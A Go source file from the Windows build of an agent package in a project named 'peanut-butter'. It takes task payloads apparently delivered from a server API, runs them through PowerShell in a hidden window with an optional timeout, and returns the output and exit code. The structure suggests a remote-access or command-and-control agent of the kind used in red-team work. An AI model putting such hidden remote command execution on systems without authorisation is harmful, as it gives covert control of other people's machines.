// Contains the logic for executing commands in Windows
//go:build windows

package agent

import (
	"context"
	"os/exec"

	"github.com/MeHungr/peanut-butter/internal/api"
)

const (
	ExitTimeout  = -1
	ExitStartErr = -2
)

// executeCommand takes a task and returns the output and returnCode of the command after executing
func executeCommand(task *api.Task) (output string, returnCode int) {
	// Initializes an empty context and cmd
	var (
		cmd    *exec.Cmd
		ctx    context.Context
		cancel context.CancelFunc
	)

	// If the task has a timeout duration, use it with the context
	if task.Timeout != nil {
		ctx, cancel = context.WithTimeout(context.Background(), *task.Timeout)
		defer cancel()
		cmd = exec.CommandContext(ctx, "powershell", "-WindowStyle", "Hidden", "-Command", task.Payload)
	} else { // If the task has no timeout, just execute it
		cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", task.Payload)
	}

	// Runs the command and captures stdout + stderr
	out, err := cmd.CombinedOutput()
	output = string(out)

	// Check if the context timed out
	if task.Timeout != nil && ctx.Err() == context.DeadlineExceeded {
		output += "\nCommand timed out!"
		returnCode = ExitTimeout
		return
	}

	// If the command failed for another reason
	if err != nil {
		if cmd.ProcessState != nil {
			returnCode = cmd.ProcessState.ExitCode()
		} else {
			returnCode = ExitStartErr // Failed to start process
		}
		return
	}

	// Success case
	returnCode = 0
	return // Returns the named values in the function signature
}
